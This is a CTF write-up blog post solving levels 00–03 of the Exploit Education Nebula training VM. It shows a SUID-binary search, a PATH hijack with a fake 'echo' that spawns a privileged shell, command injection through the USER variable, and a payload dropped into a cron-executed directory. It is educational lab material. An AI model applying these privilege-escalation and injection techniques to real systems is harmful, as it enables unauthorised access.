---
layout: post
title: "Exploit Education - Nebula"
category: ctf-writeups
mathjax: true

date: 2022-01-23
---

_Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at SUID files, Permissions. Race conditions, Shell meta-variables, $PATH weaknesses, Scripting language weaknesses
Binary compilation failures._

<!--more-->

## **Description**

Name: Nebula

Tested: Virtualbox

## **Details**

Machine Link: https://exploit.education/nebula/

Category: Exploit Education

## **Solution**

### Level00

Task: This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

Solution:

We used `find` to find out suid binaries.

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;2> /dev/null
```

We found the following specific binaries

```
/bin/.../flag00
/rofs/bin/.../flag00
```

They seem to be same files.

```
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

### Level01

Task: There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

Solution:

We have been given following source code of the program

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

By looking at the `system` command, we can see that `echo` is being called without its absolute path, so we can abuse this. First we create a `echo.c` file in the home directory with following contents

```
#include <stdlib.h>
#include <unistd.h>

int main(){
    setuid(0);
    system("/bin/sh -p");
}
```

Then we compile it to create a spoofed echo program

```
gcc echo.c -o echo
```

Finally, we add our `home` directory in the `PATH` variable using

```
export PATH=:/home/level01/:$PATH
```

This allows us to execute our malicious `echo` program instead of the correct one.

Finally, by running the program, we get a shell with privilege of user `flag01`

```
level01@nebula:~$ ../flag01/flag01
sh-4.2:$ whoami
flag01
sh-4.2:$ getflag
You have successfully executed getflag on a target account
```

### Level02

Task: There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

Solution:

We have been given following source code of the program

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);

  system(buffer);
}
```

By looking at the `asprintf` function, it is calling `getenv` to get `USER` value from the `env`. We can call the program with custom `USER` value to do a command injection attack and get the user `flag02` flag.

```
level02@nebula:~$ env USER="1llus1on ; getflag" ../flag02/flag02
about to call system("/bin/echo 1llus1on ; getflag is cool")
1llus1on
You have successfully executed getflag on a target account
```

### Level03

Task: Check the home directory of flag03 and take note of the files there. There is a crontab that is called every couple of minutes.

Solution:

First, we list files in `/home/flag03` and found the following files

```
total 1
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh
```

The directory is empty but the shell script contains the following content

```
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

For each file in the directory,

- ulimit -5 t - allow a maximum of 5 seconds in cpu time
- bash -x "$i" - execute shell script and print commands executed
- rm -f "$i" - force delete file

So we write a script in the `writeable.d` directory and wait for it to be executed. The script contains following content

```
getflag > /home/flag03/myflag
```

Now we wait till cron executes the crontab.

We can also use `watch` command to watch `/writable.d` for when the file is deleted i.e crontab executed.

```
watch ls -l writable.d
level03@nebula:/home/flag03$ ls
myflag  writable.d  writable.sh
level03@nebula:/home/flag03$ cat myflag
You have successfully executed getflag on a target account
```
